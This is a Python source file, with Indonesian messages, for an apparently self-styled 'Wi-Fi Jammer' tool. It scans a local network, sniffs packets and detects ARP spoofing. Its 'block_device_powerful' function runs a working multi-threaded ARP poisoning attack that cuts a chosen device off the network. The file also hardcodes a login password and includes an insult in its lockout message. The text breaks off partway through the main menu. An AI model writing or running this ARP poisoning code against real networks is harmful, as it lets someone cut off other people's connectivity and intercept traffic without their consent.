#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════╗
║     Wi-Fi Jammer v1.0 - ULTIMATE EDITION                      ║
║     ⚠️  SANGAT BERBAHAYA JIKA DISALAHGUNAKAN! ⚠️                        ║
║     Author: Hamzah Wisnu Dzaky                                           ║
╚══════════════════════════════════════════════════════════════════════════╝
"""

import os
import re
import sys
import time
import json
import random
import string
import threading
import subprocess
import socket
import struct
import hashlib
import getpass
import platform
from datetime import datetime
from collections import defaultdict, OrderedDict
from queue import Queue
import ctypes
import warnings
warnings.filterwarnings("ignore")
# ========== IMPORT TAMBAHAN ==========
try:
    from mac_vendor_lookup import MacLookup
    MAC_LOOKUP_AVAILABLE = True
except ImportError:
    MAC_LOOKUP_AVAILABLE = False
    print("mac_vendor_lookup not installed. Run: pip install mac-vendor-lookup")

# ========== VENDOR DATABASE DENGAN MACVENDORLOOKUP ==========
class VendorDatabase:
    def __init__(self):
        self.cache = {}
        self.initialized = False
        self.init_db()
    
    def init_db(self):
        try:
            from mac_vendor_lookup import MacLookup
            self.mac_lookup = MacLookup()
            print("Loading vendor database (first time may take a moment)...")
            self.mac_lookup.update_vendors()
            self.initialized = True
            print("Vendor database ready! 99% accuracy")
        except ImportError:
            print("mac_vendor_lookup not installed. Install: pip install mac-vendor-lookup")
            self.mac_lookup = None
        except Exception as e:
            print(f"Vendor DB error: {e}")
            self.mac_lookup = None
    
    def get_vendor(self, mac):
        if not mac or mac == "00:00:00:00:00:00" or mac == "FF:FF:FF:FF:FF:FF":
            return "Unknown"
        
        mac_upper = mac.upper()
        
        if mac_upper in self.cache:
            return self.cache[mac_upper]
        
        try:
            if self.mac_lookup and self.initialized:
                vendor = self.mac_lookup.lookup(mac_upper)
                self.cache[mac_upper] = vendor
                return vendor
        except:
            pass
        
        return "Unknown Device"
# ========== CEK ADMIN WINDOWS ==========
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    print("\n" + "="*60)
    print("[!] PERLU AKSES ADMINISTRATOR!")
    print("    Klik kanan CMD → Run as Administrator")
    print("="*60 + "\n")
    sys.exit(1)

print("[+] Running with Administrator privileges!\n")

# ========== CEK DEPENDENCIES ==========
try:
    import scapy.all as scapy
    from scapy.layers.l2 import ARP, Ether, getmacbyip
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.sendrecv import srp, srp1, send, sniff
    from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Beacon, RadioTap
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False
    print("[!] Scapy tidak ditemukan. Install: pip install scapy")
    sys.exit(1)

try:
    from colorama import init as colorama_init, Fore, Back, Style
    colorama_init(autoreset=True, convert=True, strip=True)
    COLOR_OK = True
except:
    COLOR_OK = False
    class Fore: RED=GREEN=YELLOW=BLUE=MAGENTA=CYAN=WHITE=BLACK=RESET=''
    class Style: BRIGHT=RESET_ALL=''

try:
    from tqdm import tqdm
    TQDM_OK = True
except:
    TQDM_OK = False
    def tqdm(iterable, **kwargs):
        return iterable

# ========== WARNA LENGKAP ==========
C = {
    "R": Fore.RED, "G": Fore.GREEN, "Y": Fore.YELLOW,
    "B": Fore.BLUE, "M": Fore.MAGENTA, "C": Fore.CYAN,
    "W": Fore.WHITE, "RESET": Style.RESET_ALL, "BOLD": Style.BRIGHT,
    "BLACK": Fore.BLACK, "LRED": Fore.LIGHTRED_EX, "LGREEN": Fore.LIGHTGREEN_EX,
    "LYELLOW": Fore.LIGHTYELLOW_EX, "LBLUE": Fore.LIGHTBLUE_EX, "LMAGENTA": Fore.LIGHTMAGENTA_EX,
    "LCYAN": Fore.LIGHTCYAN_EX, "LWHITE": Fore.LIGHTWHITE_EX
}

# ========== EMOJI LENGKAP ==========
EMO = {
    "wifi": "📡", "shield": "🛡️", "target": "🎯", "alert": "⚠️",
    "check": "✅", "cross": "❌", "scan": "🔍", "net": "🌐",
    "device": "💻", "router": "📶", "attack": "⚔️", "protect": "🛡️",
    "info": "ℹ️", "packet": "📦", "login": "🔐", "key": "🔑",
    "power": "⚡", "database": "🗄️", "hack": "🤖", "warning": "🚨",
    "fire": "🔥", "crown": "👑", "star": "⭐", "time": "⏰",
    "speed": "⚡", "secure": "🔒", "danger": "💀", "skull": "💀",
    "bug": "🐛", "tool": "🔧", "menu": "📋", "exit": "🚪",
    "back": "🔙", "next": "🔜", "up": "⬆️", "down": "⬇️",
    "left": "⬅️", "right": "➡️", "plus": "➕", "minus": "➖"
}

# ========== LOGIN SYSTEM ENHANCED ==========
class LoginSystem:
    def __init__(self):
        self.max_attempts = 3
        self.lockout_time = 60
        self.attempts = 0
        self.lockout_until = None
        self.valid_username = "admin"
        self.valid_password = "Hamzah123"
        
    def show_banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""
{C['BOLD']}{C['R']}╔══════════════════════════════════════════════════════════════════════════╗
{C['BOLD']}{C['R']}║{C['RESET']}                                                          {C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}  {C['BOLD']}{C['Y']}{EMO['crown']} Wi-Fi Jammer v1.0 - ULTIMATE EDITION                                  {EMO['crown']}{C['RESET']}{C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}  {C['BOLD']}{C['M']}{EMO['danger']} SANGAT BERBAHAYA JIKA DISALAHGUNAKAN!                               {EMO['danger']}{C['RESET']}{C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}  {C['BOLD']}{C['C']}{EMO['secure']} HANYA UNTUK UJI KEAMANAN JARINGAN SENDIRI! {EMO['secure']}{C['RESET']}                         {C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}                                                                              {C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}╚══════════════════════════════════════════════════════════════════════════╝{C['RESET']}

{C['BOLD']}{C['C']}{EMO['login']} AUTHENTICATION REQUIRED {EMO['login']}{C['RESET']}
{C['Y']}────────────────────────────────────────────────────────────────{C['RESET']}
        """)
    
    def login(self):
        while self.attempts < self.max_attempts:
            self.show_banner()
            
            # Cek lockout
            if self.lockout_until and time.time() < self.lockout_until:
                remaining = int(self.lockout_until - time.time())
                print(f"\n{C['R']}{EMO['warning']} TERKUNCI! Tunggu {remaining} detik...{C['RESET']}")
                time.sleep(remaining)
                self.lockout_until = None
                continue
            
            print(f"\n{C['BOLD']}{C['G']}{EMO['key']} LOGIN CREDENTIALS {EMO['key']}{C['RESET']}\n")
            
            username = input(f"  {C['C']}📝 Username:{C['RESET']} ")
            password = getpass.getpass(f"  {C['C']}🔒 Password:{C['RESET']} ")
            
            if username == self.valid_username and password == self.valid_password:
                print(f"\n{C['G']}{EMO['check']} LOGIN BERHASIL! Selamat datang, {username}!{C['RESET']}")
                print(f"{C['G']}{EMO['shield']} Membuka Kode Program Wi-Fi Jammer🤫🥴🤬😈...{C['RESET']}\n")
                
                # Animasi loading
                for i in range(3):
                    print(f"{C['C']}⚙️ Loading{'.' * (i+1)}{' ' * (3-i-1)}{C['RESET']}", end='\r')
                    time.sleep(0.5)
                print("\n")
                return True
            else:
                self.attempts += 1
                remaining = self.max_attempts - self.attempts
                print(f"\n{C['R']}{EMO['cross']} LOGIN GAGAL! Username atau password salah!{C['RESET']}")
                print(f"{C['Y']}Sisa percobaan: {remaining}{C['RESET']}")
                
                if remaining == 0:
                    print(f"\n{C['R']}{EMO['danger']} KALO SALAH GAUSAH NGOTOT GOBLOK! TERKUNCI 60 DETIK{C['RESET']}")
                    self.lockout_until = time.time() + self.lockout_time
                    self.attempts = 0
                    time.sleep(2)
                else:
                    time.sleep(1.5)
        
        return False

# ========== DATABASE VENDOR LENGKAP ==========


# ========== NETWORK TESTER UTAMA ==========
class UltimateNetworkTester:
    def __init__(self):
        self.interface = self.get_interface()
        self.targets = {}
        self.running = False
        self.arp_table = {}
        self.gateway_ip = None
        self.gateway_mac = None
        self.my_ip = None
        self.my_mac = None
        self.attack_log = []
        self.packet_stats = defaultdict(int)
        self.vendor_db = VendorDatabase()
        self.log_file = f"security_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        self.backup_file = f"network_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

        
    def log_event(self, event_type, target, details, severity="INFO"):
        """Log semua event dengan severity level"""
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'event_type': event_type,
            'target': target,
            'details': details,
            'severity': severity,
            'ip': self.my_ip,
            'interface': self.interface,
            'os': platform.system()
        }
        self.attack_log.append(log_entry)
        
        # Save to file
        try:
            with open(self.log_file, 'w') as f:
                json.dump(self.attack_log, f, indent=2)
        except:
            pass
        
        # Print dengan warna sesuai severity
        if severity == "CRITICAL":
            print(f"{C['R']}{EMO['danger']} [{severity}] {event_type}: {details}{C['RESET']}")
        elif severity == "HIGH":
            print(f"{C['R']}{EMO['alert']} [{severity}] {event_type}: {details}{C['RESET']}")
        elif severity == "MEDIUM":
            print(f"{C['Y']}{EMO['warning']} [{severity}] {event_type}: {details}{C['RESET']}")
        else:
            print(f"{C['G']}{EMO['info']} [{severity}] {event_type}: {details}{C['RESET']}")
    
    def get_interface(self):
        """Deteksi interface jaringan dengan fallback"""
        try:
            if os.name == 'nt':
                result = subprocess.run(['netsh', 'interface', 'show', 'interface'], 
                                       capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'Wi-Fi' in line or 'Wireless' in line:
                        if 'Connected' in line:
                            parts = line.split()
                            return parts[-1] if parts else "Wi-Fi"
                return "Wi-Fi"
            else:
                result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'default' in line and 'dev' in line:
                        parts = line.split()
                        idx = parts.index('dev')
                        return parts[idx + 1]
        except:
            pass
        return 'wlan0' if os.name != 'nt' else "Wi-Fi"
    
    def get_my_ip(self):
        """Dapatkan IP sendiri dengan multiple methods"""
        methods = [
            lambda: socket.gethostbyname(socket.gethostname()),
            lambda: next((ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] 
                         if not ip.startswith('127.')), None),
            lambda: self._get_ip_from_route()
        ]
        
        for method in methods:
            try:
                ip = method()
                if ip and ip != '127.0.0.1':
                    return ip
            except:
                continue
        return "192.168.1.100"
    
    def _get_ip_from_route(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return None

    def get_my_mac(self):
        """Dapatkan MAC address sendiri dengan akurasi tinggi"""
        try:
            if os.name == 'nt':
                # Method 1: ipconfig /all
                result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True)
                lines = result.stdout.split('\n')
                in_wifi = False
                for line in lines:
                    if 'Wi-Fi' in line or 'Wireless LAN' in line:
                        in_wifi = True
                    if in_wifi and 'Physical Address' in line:
                        mac = line.split(':')[-1].strip()
                        if mac and mac != '00-00-00-00-00-00':
                            return mac.replace('-', ':').upper()
                
                # Method 2: getmac command
                result = subprocess.run(['getmac', '/v', '/fo', 'list'], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'Physical Address' in line and ('Wi-Fi' in result.stdout or 'Wireless' in result.stdout):
                        mac = line.split(':')[-1].strip()
                        if mac and mac != '00-00-00-00-00-00':
                            return mac.replace('-', ':').upper()
            else:
                # Linux
                result = subprocess.run(['ip', 'link', 'show', self.interface], capture_output=True, text=True)
                match = re.search(r'link/ether ([0-9a-f:]+)', result.stdout.lower())
                if match:
                    return match.group(1).upper()
        except Exception as e:
            print(f"MAC detection error: {e}")
        
        # Manual input jika gagal
        print(f"\n{C['Y']}Gagal deteksi MAC address otomatis{C['RESET']}")
        print(f"{C['C']}Cek MAC: CMD → ipconfig /all → cari 'Physical Address' WiFi{C['RESET']}")
        manual_mac = input(f"{C['B']}Masukkan MAC address (contoh: FC:70:2E:7D:46:13): {C['RESET']}")
        return manual_mac.replace('-', ':').upper() if manual_mac else "FF:FF:FF:FF:FF:FF"
    
    def get_gateway(self):
        """Dapatkan gateway IP dan MAC"""
        try:
            if os.name == 'nt':
                result = subprocess.run(['ipconfig'], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'Default Gateway' in line and '.' in line:
                        ip = line.split(':')[-1].strip()
                        if ip and ip != '':
                            try:
                                mac = getmacbyip(ip)
                                return ip, mac
                            except:
                                return ip, None
            else:
                result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'default' in line and 'via' in line:
                        parts = line.split()
                        ip = parts[parts.index('via') + 1]
                        try:
                            mac = getmacbyip(ip)
                            return ip, mac
                        except:
                            return ip, None
        except:
            pass
        return "192.168.1.1", None
    
    def scan_network_advanced(self, ip_range=None):
        """SCAN NETWORK ADVANCED - Dengan progress bar dan detail lengkap"""
        print(f"\n{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        print(f"{C['BOLD']}{C['Y']}{EMO['scan']} ADVANCED NETWORK SCANNER {EMO['scan']}{C['RESET']}")
        print(f"{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        
        if not ip_range:
            my_ip = self.get_my_ip()
            if my_ip:
                ip_parts = my_ip.split('.')
                ip_range = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/24"
            else:
                ip_range = "192.168.1.0/24"
        
        print(f"\n{C['C']}📡 Target Range: {ip_range}{C['RESET']}")
        print(f"{C['C']}🔌 Interface: {self.interface}{C['RESET']}")
        print(f"{C['Y']}{EMO['time']} Memulai scanning...{C['RESET']}\n")
        
        try:
            arp = ARP(pdst=ip_range)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            
            if TQDM_OK:
                result = srp(packet, timeout=3, verbose=False, iface=self.interface)[0]
            else:
                print("Scanning...")
                result = srp(packet, timeout=3, verbose=False, iface=self.interface)[0]
            
            devices = []
            for sent, received in result:
                device = {
                    'ip': received.psrc,
                    'mac': received.hwsrc,
                    'vendor': self.vendor_db.get_vendor(received.hwsrc),
                    'hostname': self.get_hostname(received.psrc)
                }
                devices.append(device)
                self.arp_table[device['ip']] = device['mac']
            
            # Tampilkan hasil dengan tabel
            print(f"\n{C['BOLD']}{C['G']}{'='*70}{C['RESET']}")
            print(f"{C['BOLD']}{C['G']}{EMO['net']} DEVICES DETECTED: {len(devices)} {EMO['net']}{C['RESET']}")
            print(f"{C['BOLD']}{C['G']}{'='*70}{C['RESET']}")
            print(f"{C['BOLD']}{'No.':<5} {'IP Address':<18} {'MAC Address':<20} {'Device Type':<25}{C['RESET']}")
            print(f"{C['C']}{'-'*70}{C['RESET']}")
            
            for i, d in enumerate(devices, 1):
                print(f"{i:<5} {d['ip']:<18} {d['mac']:<20} {d['vendor'][:25]:<25}")
            
            print(f"{C['C']}{'='*70}{C['RESET']}")
            
            gateway_ip, gateway_mac = self.get_gateway()
            my_ip = self.get_my_ip()
            
            if gateway_ip:
                gw_vendor = self.vendor_db.get_vendor(gateway_mac) if gateway_mac else "Router"
                print(f"\n{C['Y']}{EMO['router']} GATEWAY: {gateway_ip} ({gateway_mac}) - {gw_vendor}{C['RESET']}")
            if my_ip:
                my_vendor = self.vendor_db.get_vendor(self.my_mac) if self.my_mac else "Computer"
                print(f"{C['G']}{EMO['device']} YOUR DEVICE: {my_ip} ({self.my_mac}) - {my_vendor}{C['RESET']}")
            
            self.log_event('SCAN', ip_range, f'Found {len(devices)} devices', 'INFO')
            return devices
            
        except Exception as e:
            print(f"{C['R']}{EMO['cross']} Scan error: {e}{C['RESET']}")
            self.log_event('ERROR', 'SCAN', str(e), 'HIGH')
            return []
    
    def get_hostname(self, ip):
        """Resolve hostname dari IP"""
        try:
            hostname = socket.gethostbyaddr(ip)[0]
            return hostname.split('.')[0]
        except:
            return "Unknown"
    
    def arp_spoofing_detection_pro(self, duration=120):
        """PRO ARP SPOOFING DETECTION - Dengan threshold dan auto response"""
        print(f"\n{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        print(f"{C['BOLD']}{C['Y']}{EMO['protect']} PRO ARP SPOOFING DETECTOR {EMO['protect']}{C['RESET']}")
        print(f"{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        
        gateway_ip, gateway_mac = self.get_gateway()
        if not gateway_ip:
            print(f"{C['R']}Cannot detect gateway!{C['RESET']}")
            return
        
        print(f"\n{C['C']}Gateway: {gateway_ip} -> {gateway_mac}{C['RESET']}")
        print(f"{C['Y']}{EMO['time']} Monitoring selama {duration} detik...{C['RESET']}")
        
        detected = False
        attack_count = defaultdict(int)
        attackers = []
        mitigation_triggered = False
        
        def arp_monitor(pkt):
            nonlocal detected, mitigation_triggered
            if pkt.haslayer(ARP) and pkt[ARP].op == 2:
                ip = pkt[ARP].psrc
                mac = pkt[ARP].hwsrc
                
                if ip == gateway_ip and gateway_mac and mac != gateway_mac:
                    attack_count[mac] += 1
                    
                    if attack_count[mac] >= 3 and not detected:
                        detected = True
                        attackers.append({'ip': ip, 'mac': mac, 'count': attack_count[mac]})
                        
                        print(f"\n{C['R']}{EMO['danger']} {'='*60}{C['RESET']}")
                        print(f"{C['R']}{EMO['alert']} ARP SPOOFING ATTACK DETECTED! {EMO['alert']}{C['RESET']}")
                        print(f"{C['R']}{'='*60}{C['RESET']}")
                        print(f"  {C['Y']}Target IP:{C['RESET']} {ip}")
                        print(f"  {C['G']}Real MAC:{C['RESET']} {gateway_mac}")
                        print(f"  {C['R']}Fake MAC:{C['RESET']} {mac}")
                        print(f"  {C['R']}Attacker:{C['RESET']} {self.vendor_db.get_vendor(mac)}")
                        print(f"  {C['Y']}Attack Count:{C['RESET']} {attack_count[mac]}")
                        
                        self.log_event('ARP_SPOOF', ip, f'Attack from {mac}', 'CRITICAL')
                        
                        # Auto mitigation option
                        if not mitigation_triggered:
                            print(f"\n{C['Y']}{EMO['shield']} Auto-mitigation available{C['RESET']}")
                            mitigation_triggered = True
        
        try:
            sniff(prn=arp_monitor, filter="arp", timeout=duration, iface=self.interface, store=0)
        except Exception as e:
            print(f"{C['R']}Sniffing error: {e}{C['RESET']}")
        
        if not detected:
            print(f"\n{C['G']}{EMO['check']} AMAN! No ARP spoofing detected during monitoring{C['RESET']}")
            self.log_event('MONITOR', 'ARP', 'No spoofing detected', 'INFO')
        
        return detected, attackers
    
    def block_device_powerful(self, target_ip):
        """POWERFUL BLOCK DEVICE - Multi-threaded ARP poisoning"""
        print(f"\n{C['BOLD']}{C['R']}{'='*70}{C['RESET']}")
        print(f"{C['BOLD']}{C['R']}{EMO['attack']} POWERFUL DEVICE BLOCKER {EMO['attack']}{C['RESET']}")
        print(f"{C['BOLD']}{C['R']}{'='*70}{C['RESET']}")
        print(f"{C['R']}{EMO['danger']} PERINGATAN: Ini akan memutus koneksi target!{C['RESET']}")
        
        # Refresh ARP table
        if target_ip not in self.arp_table:
            print(f"{C['Y']}Target not in cache, scanning...{C['RESET']}")
            self.scan_network_advanced()
        
        if target_ip not in self.arp_table:
            print(f"{C['R']}Target not found!{C['RESET']}")
            return
        
        target_mac = self.arp_table[target_ip]
        gateway_ip, gateway_mac = self.get_gateway()
        
        if not gateway_ip:
            print(f"{C['R']}Cannot detect gateway!{C['RESET']}")
            return
        
        # Target info
        vendor = self.vendor_db.get_vendor(target_mac)
        
        print(f"\n{C['C']}{'─'*50}{C['RESET']}")
        print(f"{C['BOLD']}TARGET INFORMATION:{C['RESET']}")
        print(f"  {C['Y']}IP Address:{C['RESET']} {target_ip}")
        print(f"  {C['Y']}MAC Address:{C['RESET']} {target_mac}")
        print(f"  {C['Y']}Device Type:{C['RESET']} {vendor}")
        print(f"  {C['Y']}Gateway:{C['RESET']} {gateway_ip}")
        print(f"{C['C']}{'─'*50}{C['RESET']}")
        
        confirm = input(f"\n{C['R']}Yakin ingin memblock {target_ip}? (yes/no): {C['RESET']}")
        if confirm.lower() != 'yes':
            print(f"{C['Y']}Operation cancelled{C['RESET']}")
            return
        
        print(f"\n{C['R']}{EMO['fire']} Meluncurkan ARP Poisoning Attack... {EMO['fire']}{C['RESET']}")
        print(f"{C['Y']}Tekan Ctrl+C untuk menghentikan block{C['RESET']}\n")
        
        self.running = True
        self.log_event('BLOCK', target_ip, f'Blocked {vendor}', 'HIGH')
        
        packet_count = 0
        poison_threads = []
        
        def arp_poison_worker(rate=0.5):
            nonlocal packet_count
            while self.running:
                packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                             psrc=gateway_ip, hwsrc="00:00:00:00:00:00")
                packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                             psrc=target_ip, hwsrc="00:00:00:00:00:00")
                
                send(packet1, verbose=False, iface=self.interface)
                send(packet2, verbose=False, iface=self.interface)
                packet_count += 2
                time.sleep(rate)
        
        # Multiple threads for more power
        for i in range(3):
            t = threading.Thread(target=arp_poison_worker, args=(0.5,))
            t.daemon = True
            t.start()
            poison_threads.append(t)
        
        try:
            start_time = time.time()
            with tqdm(total=100, desc=f"Blocking {target_ip}", unit="%") as pbar:
                while self.running:
                    time.sleep(1)
                    elapsed = time.time() - start_time
                    progress = min(100, (packet_count / 100))
                    pbar.update(progress - pbar.n)
                    pbar.set_postfix({
                        "Packets": packet_count,
                        "Status": "🔴 ACTIVE"
                    })
        except KeyboardInterrupt:
            self.running = False
            self.restore_network()
            print(f"\n\n{C['G']}{EMO['check']} Blocking stopped. Network restored after {int(time.time() - start_time)}s{C['RESET']}")
            self.log_event('UNBLOCK', target_ip, 'Blocking stopped by user', 'INFO')
    
    def restore_network(self):
        """Restore network ke normal"""
        print(f"\n{C['C']}{EMO['protect']} Restoring network...{C['RESET']}")
        try:
            gateway_ip, gateway_mac = self.get_gateway()
            if gateway_ip and gateway_mac:
                for ip, mac in self.arp_table.items():
                    packet = ARP(op=2, pdst=ip, hwdst=mac, psrc=gateway_ip, hwsrc=gateway_mac)
                    send(packet, count=3, verbose=False, iface=self.interface)
            
            if os.name != 'nt':
                subprocess.run(['sudo', 'ip', 'neigh', 'flush', 'all'], capture_output=True)
            
            print(f"{C['G']}{EMO['check']} Network restored successfully!{C['RESET']}")
            self.log_event('RESTORE', 'NETWORK', 'Network restored', 'INFO')
        except Exception as e:
            print(f"{C['R']}Restore error: {e}{C['RESET']}")
    
    def packet_sniffer_live(self, count=200):
        """LIVE PACKET SNIFFER dengan filtering dan statistik"""
        print(f"\n{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        print(f"{C['BOLD']}{C['Y']}{EMO['packet']} LIVE PACKET SNIFFER PRO {EMO['packet']}{C['RESET']}")
        print(f"{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        
        print(f"\n{C['C']}Target: {count} packets{C['RESET']}")
        print(f"{C['Y']}Tekan Ctrl+C untuk menghentikan{C['RESET']}\n")
        
        packets = []
        protocol_stats = defaultdict(int)
        ip_stats = defaultdict(int)
        
        def packet_callback(pkt):
            if len(packets) < count:
                packets.append(pkt)
                
                if pkt.haslayer(IP):
                    proto = pkt[IP].proto
                    proto_name = {6:'TCP', 17:'UDP', 1:'ICMP'}.get(proto, f'P-{proto}')
                    protocol_stats[proto_name] += 1
                    ip_stats[pkt[IP].src] += 1
                    
                    # Live display
                    sys.stdout.write(f"\r{C['G']}Captured:{C['RESET']} {len(packets)}/{count} | "
                                   f"{C['C']}TCP:{C['RESET']}{protocol_stats['TCP']} "
                                   f"{C['B']}UDP:{C['RESET']}{protocol_stats['UDP']} "
                                   f"{C['Y']}ICMP:{C['RESET']}{protocol_stats['ICMP']} | "
                                   f"{C['M']}Unique IPs:{C['RESET']}{len(ip_stats)}")
                    sys.stdout.flush()
        
        try:
            sniff(prn=packet_callback, count=count, iface=self.interface, timeout=60, store=0)
            
            print(f"\n\n{C['G']}{EMO['check']} Capture complete! {len(packets)} packets{C['RESET']}")
            
            # Analysis
            print(f"\n{C['BOLD']}{C['C']}{'='*50}{C['RESET']}")
            print(f"{C['BOLD']}PACKET ANALYSIS:{C['RESET']}")
            print(f"  {C['Y']}Total Packets:{C['RESET']} {len(packets)}")
            for proto, count in protocol_stats.items():
                percentage = (count / len(packets)) * 100 if packets else 0
                print(f"  {C['C']}{proto}:{C['RESET']} {count} packets ({percentage:.1f}%)")
            
            print(f"\n{C['BOLD']}TOP TALKERS:{C['RESET']}")
            top_ips = sorted(ip_stats.items(), key=lambda x: x[1], reverse=True)[:5]
            for ip, count in top_ips:
                print(f"  {C['Y']}{ip}:{C['RESET']} {count} packets")
            
            self.log_event('SNIFF', 'All traffic', f'Captured {len(packets)} packets', 'INFO')
            return packets
            
        except KeyboardInterrupt:
            print(f"\n{C['Y']}{EMO['alert']} Sniffer stopped by user{C['RESET']}")
            return packets
        except Exception as e:
            print(f"\n{C['R']}Error: {e}{C['RESET']}")
            return []
    
    def show_detailed_system_info(self):
        """Tampilkan info sistem detail"""
        print(f"\n{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        print(f"{C['BOLD']}{C['Y']}{EMO['info']} SYSTEM INFORMATION {EMO['info']}{C['RESET']}")
        print(f"{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        
        # Network Info
        print(f"\n{C['BOLD']}{C['G']}{EMO['net']} NETWORK INFORMATION:{C['RESET']}")
        print(f"  {C['Y']}Interface:{C['RESET']} {self.interface}")
        print(f"  {C['Y']}Your IP:{C['RESET']} {self.my_ip}")
        print(f"  {C['Y']}Your MAC:{C['RESET']} {self.my_mac}")
        print(f"  {C['Y']}Gateway IP:{C['RESET']} {self.gateway_ip}")
        print(f"  {C['Y']}Gateway MAC:{C['RESET']} {self.gateway_mac}")
        
        # System Info
        print(f"\n{C['BOLD']}{C['B']}{EMO['tool']} SYSTEM INFORMATION:{C['RESET']}")
        print(f"  {C['Y']}Operating System:{C['RESET']} {platform.system()} {platform.release()}")
        print(f"  {C['Y']}Python Version:{C['RESET']} {sys.version.split()[0]}")
        print(f"  {C['Y']}Hostname:{C['RESET']} {socket.gethostname()}")
        print(f"  {C['Y']}Admin/Root:{C['RESET']} Yes")
        
        # Statistics
        print(f"\n{C['BOLD']}{C['M']}{EMO['database']} STATISTICS:{C['RESET']}")
        print(f"  {C['Y']}Devices in ARP Cache:{C['RESET']} {len(self.arp_table)}")
        print(f"  {C['Y']}Total Events Logged:{C['RESET']} {len(self.attack_log)}")
        print(f"  {C['Y']}Log File:{C['RESET']} {self.log_file}")
        
        # Recent events
        if self.attack_log:
            print(f"\n{C['BOLD']}{C['C']}{EMO['time']} RECENT ACTIVITIES (last 10):{C['RESET']}")
            for log in self.attack_log[-10:]:
                severity_color = C['R'] if log['severity'] == 'CRITICAL' else C['Y'] if log['severity'] == 'HIGH' else C['G']
                print(f"  {severity_color}[{log['timestamp'][11:19]}]{C['RESET']} {log['event_type']} → {log['target']}")
    
    def show_attack_logs(self):
        """Tampilkan semua log serangan"""
        print(f"\n{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        print(f"{C['BOLD']}{C['Y']}{EMO['database']} ATTACK LOG HISTORY {EMO['database']}{C['RESET']}")
        print(f"{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        
        if not self.attack_log:
            print(f"\n{C['Y']}No logs available{C['RESET']}")
            return
        
        print(f"\n{C['BOLD']}{'No.':<5} {'Time':<12} {'Event Type':<18} {'Target':<20} {'Severity':<10}{C['RESET']}")
        print(f"{C['C']}{'-'*70}{C['RESET']}")
        
        for i, log in enumerate(self.attack_log[-30:], 1):
            severity_color = C['R'] if log['severity'] == 'CRITICAL' else C['Y'] if log['severity'] == 'HIGH' else C['G']
            print(f"{i:<5} {log['timestamp'][11:19]:<12} {log['event_type']:<18} {log['target'][:20]:<20} {severity_color}{log['severity']:<10}{C['RESET']}")
        
        print(f"{C['C']}{'='*70}{C['RESET']}")
        print(f"\n{C['Y']}Total logs: {len(self.attack_log)}{C['RESET']}")
        print(f"{C['Y']}Log file: {self.log_file}{C['RESET']}")
    
    def network_backup(self):
        """Backup network settings"""
        print(f"\n{C['C']}{EMO['back']} Creating network backup...{C['RESET']}")
        try:
            with open(self.backup_file, 'w') as f:
                f.write(f"Backup created: {datetime.now()}\n")
                f.write(f"Interface: {self.interface}\n")
                f.write(f"IP: {self.my_ip}\n")
                f.write(f"MAC: {self.my_mac}\n")
                f.write(f"Gateway: {self.gateway_ip}\n")
                f.write(f"Gateway MAC: {self.gateway_mac}\n")
                f.write(f"ARP Table: {json.dumps(self.arp_table, indent=2)}\n")
            
            print(f"{C['G']}{EMO['check']} Backup saved to: {self.backup_file}{C['RESET']}")
            self.log_event('BACKUP', 'NETWORK', 'Backup created', 'INFO')
        except Exception as e:
            print(f"{C['R']}Backup failed: {e}{C['RESET']}")
    
    def menu_ultimate(self):
        """Menu utama ultimate edition"""
        # Inisialisasi info dasar
        self.my_ip = self.get_my_ip()
        self.my_mac = self.get_my_mac()
        self.gateway_ip, self.gateway_mac = self.get_gateway()
        
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            
            print(f"""
{C['BOLD']}{C['R']}╔══════════════════════════════════════════════════════════════════════════════════════╗
{C['BOLD']}{C['R']}║{C['RESET']}                                                       {C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}     {C['BOLD']}{C['Y']}{EMO['crown']} Wi-Fi Jammer v1.0 - ULTIMATE EDITION {EMO['crown']}{C['RESET']}                                  {C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}     {C['BOLD']}{C['M']}{EMO['danger']} ⚠️  SANGAT BERBAHAYA JIKA DISALAHGUNAKAN! ⚠️ {EMO['danger']}{C['RESET']}                             {C['BOLD']}{C['R']}║
